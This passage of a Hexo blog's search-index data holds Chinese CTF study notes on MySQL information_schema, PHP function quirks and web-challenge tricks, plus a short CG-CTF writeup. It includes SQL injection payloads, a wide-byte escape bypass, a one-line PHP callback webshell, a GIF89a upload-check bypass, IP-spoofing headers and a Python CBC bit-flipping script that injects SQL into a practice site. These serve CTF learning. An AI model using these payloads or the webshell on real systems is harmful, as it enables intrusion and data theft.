Column的类型，默认是Virtual Column。\nINNODB_CMP，INNODB_CMP_RESET：存储的是关于压缩INNODB信息表的时候的相关信息，详细请见推荐笔记。\n为什么把这些表列为管理相关的表呢，因为我感觉像连接，分区，压缩表，innodb buffer pool等表，我们通过这些表都能很清晰的看到自己数据库的相关功能的状态，特别是我们通过一些变量更容易窥透MySQL的运行状态，方便我们进行管理。相关笔记有推荐innodb buffer pool小解，MySQL分区管理，information_schema系列十一。都是小编自己的笔记。\n6：关于表信息和索引信息的一些表\nTABLES，TABLESPACES，INNODB_SYS_TABLES ，INNODB_SYS_TABLESPACES ：\nTABLES这张表毫无疑问了，就是记录的数据库中表的信息，其中包括系统数据库和用户创建的数据库。show table status like 'test1'\\G的来源就是这个表；\nTABLESPACES 却是标注的活跃表空间。 这个表是不提供关于innodb的表空间信息的，对于我们来说并没有太大作用，因为我们生产库是强制INNODB的；\nINNODB_SYS_TABLES 这张表依赖的是SYS_TABLES数据字典中拉取出来的。此表提供了有关表格的格式和存储特性，包括行格式，压缩页面大小位级别的信息（如适用）\n提供的是关于INNODB的表空间信息，其实和SYS_TABLESPACES 中的INNODB信息是一致的。\nSTATISTICS：这个表提供的是关于表的索引信息，所有索引的相关信息。\nINNODB_SYS_INDEXES：提供相关INNODB表的索引的相关信息，和SYS_INDEXES 这个表存储的信息基本是一样的，只不过后者提供的是所有存储引擎的索引信息，后者只提供INNODB表的索引信息。\nINNODB_SYS_TABLESTATS：\n这个表就比较重要了，记录的是MySQL的INNODB表信息以及MySQL优化器会预估SQL选择合适的索引信息，其实就是MySQL数据库的统计信息\n这个表的记录是记录在内存当中的，是一个内存表，每次重启后就会重新记录，所以只能记录从上次重启后的数据库统计信息。有了这个表，我们对于索引的维护就更加方便了，我们可以查询索引的使用次数，方便清理删除不常用的索引，提高表的更新插入等效率，节省磁盘空间。\nINNODB_SYS_FIELDS ：这个表记录的是INNODB的表索引字段信息，以及字段的排名\nINNODB_FT_CONFIG :这张表存的是全文索引的信息\nINNODB_FT_DEFAULT_STOPWORD：这个表存放的是stopword 的信息,是和全文索引匹配起来使用的，和innodb的 INFORMATION_SCHEMA.INNODB_FT_DEFAULT_STOPWORD 是相同的，这个STOPWORD必须是在创建索引之前创建，而且必须指定字段为varchar。stopword 也就是我们所说的停止词，全文检索时，停止词列表将会被读取和检索，在不同的字符集和排序方式下，会造成命中失败或者找不到此数据，这取决于停止词的不同的排序方式。我们可以使用这个功能筛选不必要字段。\nINNODB_FT_INDEX_TABLE：这个表存储的是关于INNODB表有全文索引的索引使用信息的，同样这个表也是要设置innodb_ft_aux_table以后才能够使用的，一般情况下是空的\nINNODB_FT_INDEX_CACHE ：这张表存放的是插入前的记录信息，也是为了避免DML时候昂贵的索引重组\n7：关于MySQL优化相关的一些表\nOPTIMIZER_TRACE ：提供的是优化跟踪功能产生的信息.关于这个我也谢了做了一个小测试，MySQL追踪优化器小试\nPROFILING：SHOW PROFILE可以深入的查看服务器执行语句的工作情况。以及也能帮助你理解执行语句消耗时间的情况。一些限制是它没有实现的功能，不能查看和剖析其他连接的语句，以及剖析时所引起的消耗。\nSHOW PROFILES显示最近发给服务器的多条语句，条数根据会话变量profiling_history_size定义，默认是15，最大值为100。设为0等价于关闭分析功能。详细信息请见MySQL profile\nINNODB_FT_BEING_DELETED,INNODB_FT_DELETED: INNODB_FT_BEING_DELETED 这张表是INNODB_FT_DELETED的一个快照,只在OPTIMIZE TABLE 的时候才会使用。详细信息详见我的OPTIMIZE TABLE 小解\n8：关于MySQL事物和锁的相关的一些表\nINNODB_LOCKS:现在获取的锁，但是不含没有获取的锁，而且只是针对INNODB的。\nINNODB_LOCK_WAITS：系统锁等待相关信息，包含了阻塞的一行或者多行的记录，而且还有锁请求和被阻塞改请求的锁信息等。\nINNODB_TRX：包含了所有正在执行的的事物相关信息（INNODB），而且包含了事物是否被阻塞或者请求锁。\n我们通过这些表就能够很方便的查询出来未结束的事物和被阻塞的进程，这是不是更方便了，详细可见information_schema系列八(事物，锁)\n```\n\n\n\n\n\n\n\n\n\n> * 获取数据库表列名，id=1%df' and 1=2 union select 1,group_concat(column_name) from information_schema.COLUMNS where table_name=ctf4 %23\n```\n1、informaiton_schema.columns 常用列：\n\n　　1、table_catalog　　　　　　　　　　：不管是table | view 这个列的值总是def\n\n　　2、table_schema　　　　　　　　　  ：表 | 视图所在的数据库名\n\n　　3、table_name　　　　　　　　　　  ：表名 | 视图名\n\n　　4、column_name　　　　　　　　　  ：列名\n\n　　5、column_default　　　　　　　　   ：列的默认值\n\n　　6、is_nullable　　　　　　　　　　　  ：是否可以取空值\n\n　　7、data_type　　　　　　　　　　　  ：列的数据类型\n\n　　8、character_maximum_length　　  ：列的最大长度（这列只有在数据类型为char | varchar 时才有意义）\n\n　　9、column_type　　　　　　　　　　 ：列类型这个类型比data_type列所指定的更加详细，如data_type 是int 而column_type 就有可以能是int(11)\n\n　　10、column_key　　　　　　　　　　 ：列上的索引类型 主键-->PRI  | 唯一索引 -->UNI  一般索引 -->MUL\n```\n\n\n\n> * MySQL执行查询时会跳过畸形字符\n> http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2  \n> 和\nhttp://chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6%27--+ \n返回结果相同。\n由于MySQL执行查询时会跳过畸形字符，而 id=2%d6%27--+  经过转义变为id=2%d6%5c%27--+ ，\n其中%d6%5c被合在一起解释，也就是id = '2Ö'-- 效果等价于 id = '2'--，但我们获得了执行sql的机会。\n\n\n> * md5()函数要求接收一个字符串，若传递进去一个数组，则会返回null\n\n> * PHP isset() 函数\n> 检测变量是否设置，并且不是 NULL。\n如果已经使用 unset() 释放了一个变量之后，它将不再是 isset()。若使用 isset() 测试一个被设置成 NULL 的变量，将返回 FALSE。同时要注意的是一个 NULL 字节（\"\\0\"）并不等同于 PHP 的 NULL 常数。\n\n> * php $_SERVER['REQUEST_METHOD']判断表单是post还是get提交\n\n> * PHP extract() 函数\n> extract() 函数从数组中将变量导入到当前的符号表。\n该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。\n该函数返回成功设置的变量数目。\n*若没有另外指定，函数将覆盖已有变量\n\n\n> * X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。它不是RFC中定义的标准请求头信息，在squid缓存代理服务器开发文档中可以找到该项的详细介绍。标准格式如下:X-Forwarded-For: client1, proxy1, proxy2。\n\n\n> * PHP trim() 函数\n> trim($str,\"Hed!\"); 移除字符串两侧的字符（ Hello World! \"Hello\" 中的 \"He\" 以及 \"World\" 中的 \"d!\"）：\n> trim() 函数移除字符串两侧的空白字符或其他预定义字符。\n\n\n> * strcmp函数在比较失败，即传入数组，时会返回null。\n\n\n> * get_magic_quotes_gpc — 获取当前 magic_quotes_gpc 的配置选项设置\n> 如果 magic_quotes_gpc 为关闭时返回 0，否则返回 1。在 PHP 5.4.O 起将始终返回 FALSE\n> 当 magic_quotes_gpc 打开时，所有的 ‘ (单引号), ” (双引号), (反斜线) and 空字符会自动转为含有反斜线的溢出字符。\n\n\n\n> *  PHP stripslashes() 函数\n> 删除反斜杠\n> addslashes() 函数添加的反斜杠。\n\n> * md5(\"ffifdyop\")  出现 \"\"\n\n> * unserialize() 反序列化字符串。  PHP\n> * serialize()  序列化字符串     PHP\n> 序列化后：O:8:”just4fun”:2:{s:6:”secret”;N;s:5:”enter”;R:2;}\njust4fun Object ( [secret] => [enter] => )\n\n\n> * php类可能会包含一些特殊的函数叫magic函数，magic函数命名是以符号__开头的，比如__construct, __destruct, __toString, __sleep, __wakeup等等。这些函数在某些情况下会自动调用，比如__construct当一个对象创建时被调用，__destruct当一个对象销毁时被调用，__toString当一个对象被当作一个字符串使用。在下列代码中增加了三个magic方法，__construct, __destruct和__toString。可以看出，__construct在对象创建时调用，__destruct在php脚本结束时调用，__toString在对象被当作一个字符串使用时调用。\n\n\n\n> * PHP htmlentities() 函数\n> 把字符转换为 HTML 实体\n> 选值为ENT_QUOTES时 会转义一些字符   '  =>   \\'\n\n> * PHP ceil() 函数\n> ceil() 函数向上舍入为最接近的整数。\n\n> * PHP mysql_num_rows() 函数\n> mysql_num_rows() 函数返回结果集中行的数目。\n\n\n> * Bash shell在“~/.bash_history”（“~/”表示用户目录）文件中保存了500条使用过的命令，这样能使你输入使用过的长命令变得容易。每个在系统中拥有账号的用户在他的目录下都有一个“.bash_history”文件。\n> http://(host)/.bash_history  查看\n\n\n> * PHP strcasecmp() 函数\n> 比较两个字符串（不区分大小写\n\n> * PHP mysql_fetch_array() 函数\n> mysql_fetch_array() 函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有\n返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false。\n\n\n\n> * var_dump(!strcasecmp(array(), $query[pw]));//bool(true)\n> var_dump(!strcasecmp(md5(array()), $query[pw]));//bool(false)\n\n\n> * SQL MID() 函数\n> MID 函数用于从文本字段中提取字符。\n> 参数\t               描述\ncolumn_name\t必需。要提取字符的字段。\nstart\t必需。规定开始位置（起始值是 1）。\nlength\t可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。\n\n> * PHP addslashes() 函数\n> addslashes() 函数返回在预定义字符之前添加反斜杠的字符串。\n\n> * 尝试各种伪造IP的HTTP头\n> X-Forwarded-For\nClient-IP\nx-remote-IP\nx-originating-IP\nx-remote-addr\n\n\n> * %00 能绕过is_numeric()\n>\n> * SQL的IF语句\n> IF(expr1,expr2,expr3)\n> 如果 expr1 是TRUE (expr1 <> 0 and expr1 <> NULL)，则 IF()的返回值为expr2; 否则返回值则为 expr3。IF() 的返回值为数字值或字符串值，具体情况视其所在语境而定。\n\n> * PHP is_numeric() 函数\n> is_numeric() 函数用于检测变量是否为数字或数字字符串。\n\n> * PHP mysql_real_escape_string() 函数\n> mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。\n> 如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。\n> **参数\t描述**\nstring\t必需。规定要转义的字符串。\nconnection\t可选。规定 MySQL 连接。如果未规定，则使用上一个连接。\n\n> * 绕空格的一些常见方法如下：\n> %20 %09 %0a %0b %0c %0d %a0 %00 /**/ /*!*/\n\n> * PHP str_split() 函数\n> str_split() 函数把字符串分割到数组中。\n> **参数\t描述**\nstring\t必需。规定要分割的字符串。\nlength\t可选。规定每个数组元素的长度。默认是 1。\n\n> * PHP count() 函数\n> count() 函数返回数组中元素的数目。\n\n\n> * PHP file_get_contents() 函数 \n> file_get_contents() 函数把整个文件读入一个字符串中。\n和 file() 一样，不同的是 file_get_contents() 把文件读入一个字符串。\nfile_get_contents() 函数是用于将文件的内容读入到一个字符串中的首选方法。如果操作系统支持，还会使用内存映射技术来增强性能。\n\n\n\n> * SQL exists()\n> EXISTS用于检查子查询是否至少会返回一行数据，该子查询实际上并不返回任何数据，而是返回值True或False\nEXISTS 指定一个子查询，检测 行 的存在。\n\n\n> * SQL count() 检查数量\n\n\n> * SQL ORD()函数\n> 如果最左边的字符不是一个多字节字符，ORD()返回相同的值如ASCII()函数。\n\n\n> * SQL SUBSTRING 函数 \n>  SQL 中的 substring 函数是用来抓出一个栏位资料中的其中一部分。\n\n\n\n> * SQL ascii()\n> 字符转ascii值\n         \n\n\n> * $_REQUEST — HTTP Request 变量\n默认情况下包含了 $_GET，$_POST 和 $_COOKIE 的数组。\n\n\n\n> * PHP array_walk() 函数\n> array_walk() 函数对数组中的每个元素应用用户自定义函数。在函数中，数组的键名和键值是参数。\n\n\n\n> * PHP preg_replace() 函数\n> preg_replace 函数执行一个正则表达式的搜索和替换。\n\n\n> * 回调函数木马\n> <?php $e = $_REQUEST['www']; $arr = array($_POST['wtf'] => '|.*|e',); array_walk($arr, $e, ''); ?>\n\n\n> * scandir()函数\n> scandir() 函数返回指定目录中的文件和目录的数组。\n> scandir(directory,sorting_order,context);　\n> 使用opendir、readdir、closedir\nopendir() 函数打开一个目录句柄，若成功，则该函数返回一个目录流，否则返回 false 以及一个 error。可以通过在函数名前加上 \"@\" 来隐藏 error 的输出。\nreaddir() 函数返回由 opendir() 打开的目录句柄中的条目。若成功，则该函数返回一个文件名，否则返回 false。\nclosedir — 关闭目录句柄。\n\n\n> * print_r(scandir(\".\"));  获取当前目录结构\n\n> * unlink的问题非常明显，/.的后缀就可以绕过\n\n> * PHP print_r() 函数\n> print_r() 函数用于打印变量，以更容易理解的形式展示。\n\n\n> * linux下一般使用vi编辑器，并且异常退出会留下备份文件\n> (host)/.submit.php.swp\n\n\n\n> * PHP file_get_contents()函数\n> 能够远程打开链接\n\n> *  PHP输入流php://input\n> php://input可以读取没有处理过的POST数据。相较于$HTTP_RAW_POST_DATA而言，它给内存带来的压力较小，并且不需要特 殊的php.ini设置。php://input不能用于enctype=multipart/form-data\n\n\n\n> * PHP extract() 函数\n> extract() 函数从数组中将变量导入到当前的符号表。\n> 该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。\n第二个参数 type 用于指定当某个变量已经存在，而数组中又有同名元素时，extract() 函数如何对待这样的冲突。\n该函数返回成功导入到符号表中的变量数目。\n\n\n> * PHP file_put_contents() 函数\n> file_put_contents() 函数把一个字符串写入文件中。\n与依次调用 fopen()，fwrite() 以及 fclose() 功能一样。\n\n> * MAKE_SET(bits,str1,str2,...)\n返回一个设定值 (一个包含被‘,’号分开的字字符串的字符串) ，由在bits 组中具有相应的比特的字符串组成。str1 对应比特 0, str2 对应比特1,以此类推。str1, str2, ...中的 NULL值不会被添加到结果中。\n``` SQL\nmysql> SELECT MAKE_SET(1,'a','b','c');\n\n-> 'a'\n\nmysql> SELECT MAKE_SET(1 | 4,'hello','nice','world');\n\n-> 'hello,world'\n\nmysql> SELECT MAKE_SET(1 | 4,'hello','nice',NULL,'world');\n\n-> 'hello'\n\nmysql> SELECT MAKE_SET(0,'a','b','c');\n\n-> ''\n--------------------- \n```\n\n> * xpath处理函数(extractvalue和updatexml)：\n从mysql5.1.5开始提供两个XML查询和修改的函数，其中extractvalue负责在xml文档中按照xpath语法查询节点内容，updatexml则负责修改查询到的内容。\nmysql> select * from mysql.user where user = 'root' and extr\n\n\n\n> * PHP str_replace()\n> str_replace(\"要替换的字符串\",\"替换成的结果字符串\"，“目标字符串”)\n\n\n\n> * php create_function()匿名函数\n> create_function(‘参数’,’函数体’):\ncreate_function创建的是匿名函数，而匿名函数也是有名字的，名字是\\x00lambda_%d，其中%d代表他是当前进程中的第几个匿名函数。%d会从1一直进行递增，表示这是当前进程中第几个匿名函数。因此如果开启一个新的php进程，那么这个匿名函数就是\\x00lambda_1\n\n\n> * openssl_random_pseudo_bytes - 生成伪随机字节串\n> 它还指示是否使用加密强算法来生成伪随机字节，并通过可选crypto_strong 参数执行此操作。这种情况很少见FALSE，但有些系统可能会破损或过时。\n\n\n> * PHP bin2hex() 函数 \n> bin2hex() 函数把 ASCII 字符的字符串转换为十六进制值。字符串可通过使用 pack() 函数再转换回去。\n\n\n> * Apache的默认模式Pre-fork会随着请求数量的增加而启动若干新的进程 。\n\n\n> *  sha1()函数默认的传入参数类型是字符串型，可以传入其他类型，使其返回值为false。如数组类型。\n\n> * 使用git log命令，什么参数都没有的话，会输出所有的日志。如果日志特别多的话，在git bash中，按向下键来查看更多，按q键退出查看日志。\ngit reset\n常用的到命令，主要有三种情况。\n错误commit后，仅撤销commit，暂存区、工作区内容不变。\ngit log \ngit reset --soft commit-id  // commit-id为错误commit之前的，commit-ID\n// 如   \n// commit-id f34a (错误的commit，当前版本库)\n// 一些描述\n// commit-id d3fs (正确的commit）\n// git reset --soft d3fs\n\n错误commit后，撤销commit和add，工作区内容不变\ngit log \ngit reset --mixed commit-id \n// 该命令相当于恢复到 git add 之前的状态，同时工作区的内容不变\n\n错误commit之后，想恢复到某个版本库的代码(暂存区，工作区均变化）\ngit log\ngit reset --hard commit-id \n\n\n> * PHP strpos() 函数\n> strpos() 函数查找字符串在另一字符串中第一次出现的位置。\n\n\n> * PHP str_rot13() 函数\n> str_rot13() 函数对字符串执行 ROT13 编码。\nROT13 编码把每一个字母在字母表中向前移动 13 个字母。数字和非字母字符保持不变。\n\n> * md5(\"ffifdyop\") 产生 or'\n\n> * GET参数SQL注入%0A换行污染绕过\n> 在GET请求时，将URL的SQL注入关键字用%0A分隔，%0A是换行符，在mysql中可以正常执行。\n\n> * PHP in_array() 函数\n> in_array() 函数搜索数组中是否存在指定的值。\n\n> * %a0=空格\n\n\n> * php精度（16以上）var_dump(9999999999999999999==1);//true\n\n> * PHP strripos() 函数\n> strripos() 函数查找字符串在另一字符串中最后一次出现的位置。\n\n> * PHP NULL==0\n\n> * strpos处理数组，返回NULL\n\n> * PHP is_numeric() 函数\n> is_numeric() 函数用于检测变量是否为数字或数字字符串\n\n> * PHP弱类型的一个特性，当一个整形和一个其他类型行比较的时候，会先把其他类型intval再比。\n\n> * md5运算函数有一个true参数，它的作用是将md5后的hex转换成字符串，这里如果后的字符串有单引号之类的字符就可以注入了\n\n> * PHP strrev() 函数\n> strrev() 函数反转字符串。\n\n\n> * getimagesize函数验证：\n> 只要在文件头添加GIF89a即可，我们来测试一下\nvar_dump(getimagesize(“phpinfo.php”));\n然后phpinfo.php文件的内容为：<?php phpinfo(); ?>\n结果返回bool(false)\n修改文件内容如下：\nGIF89a\n<?php phpinfo(); ?>\n返回结果为\narray(6) {\n[0]=>\nint(2573)\n[1]=>\nint(16188)\n[2]=>\nint(1)\n[3]=>\nstring(27) “width=”2573″ height=”16188″”\n[“channels”]=>\nint(3)\n[“mime”]=>\nstring(9) “image/gif”\n}\n\n> * 以iconv()函数为例，在iconv转码的过程中,utf->gb2312(其他部分编码之间转换同样存在这个问题)会导致字符串被截断，如：$filename=”shell.php(hex).jpg”;(hex为0x80-0x99)，经过iconv转码后会变成$filename=”shell.php “。\n\n> * Data URI scheme (data: base64) 协议常用数据格式\n    data:,<文本数据>  \n    data:text/plain,<文本数据>  \n    data:text/html,<HTML代码>  \n    data:text/html;base64,<base64编码的HTML代码>  \n    data:text/css,<CSS代码>  \n    data:text/css;base64,<base64编码的CSS代码>  \n    data:text/javascript,<Javascript代码>  \n    data:text/javascript;base64,<base64编码的Javascript代码>  \n    data:image/gif;base64,base64编码的gif图片数据  \n    data:image/png;base64,base64编码的png图片数据  \n    data:image/jpeg;base64,base64编码的jpeg图片数据  \n    data:image/x-icon;base64,base64编码的icon图片数据\nURI（Uniform Resource Identifier）:统一资源标识符,服务器资源名被称为统一资源标识符。\nURL（Uniform Resource Locator）:统一资源定位符，描述了一台特定服务器上某资源的特定位置。\nURN（Uniform Resource Name）:统一资源名称\n\n> * PHP文件包含漏洞的产生原因是在通过PHP的函数引入文件时，由于传入的文件名没有经过合理的> 校验，从而导致意外的文件泄露甚至恶意的代码注入。涉及文件包含漏洞的四个函数如下：\n> include()\n> include_once()\nrequire()\nrequire_once()\nreuqire() 如果在包含的过程中有错，比如文件不存在等，则会直接退出，不执行后续语句。\ninclude() 如果出错的话，仍然会继续执行后续语句。\nrequire_once()和 include_once()功能与require()和 include()类似，如果一个文件已经被包含过了，则不会再次包含。\n\n\n\n# Misc 题 笔记\n> * Binwalk是路由器固件分析的必备工具，该工具最大的优点就是可以自动完成指定文件的扫描，智能发掘潜藏在文件中所有可疑的文件类型及文件系统。\n```\n2、Binwalk的提取与分析\n\n2.1、固件扫描\n\n　　命令：binwalk firmware.bin      ----->   通过扫描能够智能地发现目标文件中包含的所有可识别的文件类型。\n\n2.2、提取文件\n\n　　命令：binwalk -e firmware.bin ------>   选项“-e\"和“--extract\"用于按照定义的配置文件中的提取方法从固件中提取探测到的文件系统。\n\n　　命令：binwalk -Me firmware.bin -----> 选项“-M\"和“--matryoshka\"用于根据magic签名扫描结果进行递归提取，仅对\"-e\"和“--dd\"选项有效。\n\n　　命令：binwalk -Me -d 5 firmware.bin ----> 选项“-d\"和“--depth=<int>\"用于限制递归提取深度，默认深度为8，仅当“-M\"选项存在时有效。\n\n2.3、显示完整的扫描结果\n\n　　命令：binwalk -I firmware.bin ------>   选项\"-I\"和“--invalid\"用于显示扫描的所有结果（即使是扫描过程中被定义为“invalid“的项）。\n\n　　　　　　当我们认为binwalk错把有效的文件当成无效文件时，可以通过该选项来检查。\n\n2.4、指令系统分析\n\n　　选项“A\"和“--opcodes\"用于扫描指定文件中通用CPU架构的可执行代码。\n\n　　由于某些操作码签名比较短，所以比较容易造成误判。如果我们需要确定一个可执行文件的CPU架构，可以使用该命令。\n\n　　命令：命令：binwalk -A 70|more \n\n　　使用Binwalk扫描从firmware.bin中提取的文件的文件“70”中的可执行代码，在该文件中可以发现CPU的架构（大端或者小端也会给出）。\n```\n\n# Crypto题笔记\n\n> * Python里面的hashlib模块提供了很多加密的算法\n``` python\nimport hashlib\npool = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'\ns0 = 'TASC?O3RJMV?WDJKX?ZM'\nss = s0.split('?')\nm = 'e9032???da???08????911513?0???a2'\n\nfor i in pool:\n    for j in pool:\n        for k in pool:\n            md5 = hashlib.md5()\n            s = ss[0] + i + ss[1] + j + ss[2] + k + ss[3]\n            md5.update(s.encode('utf-8'))\n            #print(s)\n            if md5.hexdigest()[:5] == m[:5]:\n                print(s,md5.hexdigest())\n                break\n```\n\n\n\n# 实验吧\n\n## 实验吧web题\n\n### 简单的登录题\n``` python\n# -*- coding:utf8 -*-\n# python 2.7\nfrom base64 import *\nimport urllib\nimport requests\nimport re\n\ndef denglu(payload,idx,c1,c2):\n\n    url=r'http://ctf5.shiyanbar.com/web/jiandan/index.php'\n\n    payload = {'id': payload}\n\n    r = requests.post(url, data=payload)\n\n    Set_Cookie=r.headers['Set-Cookie']\n\n    iv=re.findall(r\"iv=(.*?),\", Set_Cookie)[0]\n\n    cipher=re.findall(r\"cipher=(.*)\", Set_Cookie)[0]\n\n    iv_raw = b64decode(urllib.unquote(iv))\n\n    cipher_raw=b64decode(urllib.unquote(cipher))\n\n    lst=list(cipher_raw)\n\n    lst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2))\n\n    cipher_new=''.join(lst)\n\n    cipher_new=urllib.quote(b64encode(cipher_new))\n\n    cookie_new={'iv': iv,'cipher':cipher_new}\n\n    r = requests.post(url, cookies=cookie_new)\n\n    cont=r.content\n\n    plain = re.findall(r\"base64_decode\\('(.*?)'\\)\", cont)[0]\n\n    plain = b64decode(plain)\n\n    first='a:1:{s:2:\"id\";s:'\n\n    iv_new=''\n\n    for i in range(16):\n\n        iv_new += chr(ord(first[i])^ord(plain[i])^ord(iv_raw[i]))\n\n    iv_new = urllib.quote(b64encode(iv_new))\n\n    cookie_new = {'iv': iv_new, 'cipher': cipher_new}\n\n    r = requests.post(url, cookies=cookie_new)\n\n    rcont = r.content\n\n    print rcont\n\ndenglu('12',4,'2','#')\n\ndenglu('0 2nion select * from((select 1)a join (select 2)b join (select 3)c);'+chr(0),6,'2','u')\n\ndenglu('0 2nion select * from((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);'+chr(0),7,'2','u')\n\ndenglu(\"0 2nion select * from((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp 'you_want')b join (select 3)c);\"+chr(0),7,'2','u')\n\ndenglu(\"0 2nion select * from((select 1)a join (select * from you_want)b join (select 3)c);\"+chr(0),6,'2','u')\n\n```","tags":["CTF"]},{"title":"CG-CTF-Web题-writeup","url":"%2F2018%2F11%2F26%2FCG-CTF-Web%E9%A2%98-writeup%2F","content":"![hello](CG-CTF-Web题-writeup/img/1.jpeg)\n\n------\n# 前言\n\n### URL:[CG-CTF](https://cgctf.nuptsast.com/challenges#Web)\n**记录也是一种收获**\n\n------\n# 正文\n## WEB篇-Writeup\n\n### [签到题](http://chinalover.sinaapp.com/web1/)\n![签到题](CG-CTF-Web题-writeup/img/1.png)\n点开链接\n![签到题](CG-CTF-Web题-writeup/img/2.png)\n\n右键查看源代码看到\n![签到题](CG-CTF-Web题-writeup/img/3.png)\n**KEY：** nctf{flag_admiaanaaaaaaaaaaa}\n\n\n### [md5 collision](http://chinalover.sinaapp.com/web19/)\n\n提示源码PHP :\n```PHP\n$md51 = md5('QNKCDZO');\n$a = @$_GET['a'];\n$md52 = @md5($a);\nif(isset($a)){\nif ($a != 'QNKCDZO' && $md51 == $md52) {\n    echo \"nctf{*****************}\";\n} else {\n    echo \"false!!!\";\n}}\nelse{echo \"please input a\";}\n```\n利用PHP弱类型，MD5加密QNKCDZ0发现是0Exxxxxxxxx之类的字符，弱类型比较表示0\n只要找到md5加密后字符串以0e开头即可\n**KEY：** nctf{md5_collision_is_easy}","tags":["Writeup"],"categories":["Web"]},{"title":"Hello World","url":"%2F2018%2F11%2F26%2Fhello-world%2F","content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/deployment.html)\n"}]